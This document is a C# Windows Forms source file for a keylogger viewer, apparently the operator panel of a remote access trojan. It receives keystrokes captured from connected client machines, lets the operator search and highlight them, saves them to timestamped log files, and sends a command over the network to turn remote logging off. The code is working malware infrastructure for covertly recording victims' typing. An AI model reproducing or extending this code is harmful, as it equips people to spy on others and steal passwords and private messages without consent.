﻿using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
    public partial class FormKeylogger : Form
    {
        public StringBuilder Sb = new StringBuilder();

        public FormKeylogger()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        public string FullPath { get; set; }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }

        private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
        {
            Sb?.Clear();
            if (Client != null)
                ThreadPool.QueueUserWorkItem(o =>
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "Logger";
                    msgpack.ForcePathObject("isON").AsString = "false";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                });
        }

        private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            richTextBox1.SelectionStart = 0;
            richTextBox1.SelectAll();
            richTextBox1.SelectionBackColor = Color.White;
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(toolStripTextBox1.Text))
            {
                var startindex = 0;
                while (startindex < richTextBox1.TextLength)
                {
                    var wordstartIndex = richTextBox1.Find(toolStripTextBox1.Text, startindex, RichTextBoxFinds.None);
                    if (wordstartIndex != -1)
                    {
                        richTextBox1.SelectionStart = wordstartIndex;
                        richTextBox1.SelectionLength = toolStripTextBox1.Text.Length;
                        richTextBox1.SelectionBackColor = Color.Yellow;
                    }
                    else
                    {
                        break;
                    }

                    startindex += wordstartIndex + toolStripTextBox1.Text.Length;
                }
            }
        }

        private void ToolStripButton1_Click(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                File.WriteAllText(FullPath + $"\\Keylogger_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.txt",
                    richTextBox1.Text.Replace("\n", Environment.NewLine));
            }
            catch
            {
            }
        }
    }
}